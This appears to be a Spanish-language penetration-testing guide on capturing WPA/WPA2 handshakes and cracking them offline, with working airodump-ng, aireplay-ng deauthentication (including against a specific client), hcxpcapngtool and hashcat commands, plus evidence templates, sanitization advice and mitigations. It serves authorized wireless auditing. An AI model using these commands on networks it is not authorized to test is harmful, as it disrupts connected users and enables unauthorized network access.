# Handshake Capture

> Técnica: capturar el 4-way handshake WPA/WPA2 para validación offline de fortaleza de contraseña.

!!! warning "Uso autorizado"
    Capturar handshakes únicamente en redes propias, laboratorios o auditorías autorizadas.  
    No usar deauthentication si no está explícitamente permitido.

---

## Cuándo usar

- Red WPA/WPA2-Personal.
- Hay al menos un cliente conectado.
- Se quiere validar fortaleza de passphrase.
- El alcance permite captura pasiva o deauth controlado.
- Se va a realizar cracking offline autorizado.

---

## Variables

```bash
export MON_IFACE="wlan0mon"
export ESSID="LAB_WIFI"
export BSSID="AA:BB:CC:DD:EE:FF"
export CHANNEL="6"
export OUTDIR="$PWD/evidence"
mkdir -p "$OUTDIR"
```

---

## Captura pasiva

```bash
sudo airodump-ng \
  --bssid "$BSSID" \
  --channel "$CHANNEL" \
  --write "$OUTDIR/handshake" \
  "$MON_IFACE"
```

Esperar a que un cliente se conecte o reautentique.

---

## Captura con deauth controlado

!!! danger "Precaución"
    La deautenticación interrumpe clientes. Usar solo en laboratorio o si el alcance lo permite.

```bash
sudo aireplay-ng \
  --deauth 3 \
  -a "$BSSID" \
  "$MON_IFACE"
```

Contra cliente concreto:

```bash
export CLIENT="11:22:33:44:55:66"

sudo aireplay-ng \
  --deauth 3 \
  -a "$BSSID" \
  -c "$CLIENT" \
  "$MON_IFACE"
```

---

## Confirmar handshake

Con aircrack-ng:

```bash
aircrack-ng "$OUTDIR/handshake-01.cap"
```

Con hcxpcapngtool:

```bash
hcxpcapngtool -o "$OUTDIR/handshake.hc22000" "$OUTDIR/handshake-01.cap"
```

Comprobar que se generó hash:

```bash
ls -lah "$OUTDIR/handshake.hc22000"
head "$OUTDIR/handshake.hc22000"
```

---

## Cracking offline

```bash
hashcat -m 22000 "$OUTDIR/handshake.hc22000" wordlist.txt
```

Mostrar resultado:

```bash
hashcat -m 22000 "$OUTDIR/handshake.hc22000" --show
```

---

## Usando Airgeddon

Flujo típico:

```text
1. Seleccionar interfaz
2. Activar modo monitor
3. Seleccionar objetivo
4. Elegir captura de handshake
5. Elegir modo pasivo o deauth controlado
6. Validar handshake
7. Convertir si aplica
8. Cracking offline autorizado
```

---

## Qué buscar

| Señal | Interpretación |
|---|---|
| `WPA handshake: BSSID` en airodump | Handshake detectado |
| `.cap` generado | Captura disponible |
| `.hc22000` generado | Hash listo para hashcat |
| Hashcat recupera passphrase | Contraseña débil |
| No hay clientes | Mejor probar PMKID si aplica |
| Handshake inválido | Repetir captura |

---

## Evidencia mínima

```text
SSID:
BSSID:
Canal:
Cliente:
Método:
Fichero .cap:
Fichero .hc22000:
Validación:
Resultado cracking:
Impacto:
```

---

## Sanitización

No publicar:

```text
.cap reales
.hc22000 reales
passphrase recuperada
BSSID real
SSID de cliente
MAC de clientes
```

Ejemplo público:

```text
SSID: LAB_WIFI
BSSID: AA:BB:CC:DD:EE:FF
Capture: handshake.cap <private>
Result: weak passphrase recovered <redacted>
```

---

## Falsos positivos / errores comunes

- Captura sin handshake válido.
- Handshake de otro BSSID.
- Canal incorrecto.
- Cliente no asociado al objetivo.
- Diccionario no contiene la contraseña.
- El cracking falla, pero eso no implica que la red sea segura.
- Passphrase recuperada en laboratorio, pero no documentada correctamente.

---

## Mitigación

- Usar WPA2/WPA3 con passphrases largas y aleatorias.
- Evitar contraseñas basadas en diccionarios.
- Deshabilitar WPS.
- Usar WPA3-SAE cuando sea viable.
- Monitorizar deauth y actividad anómala.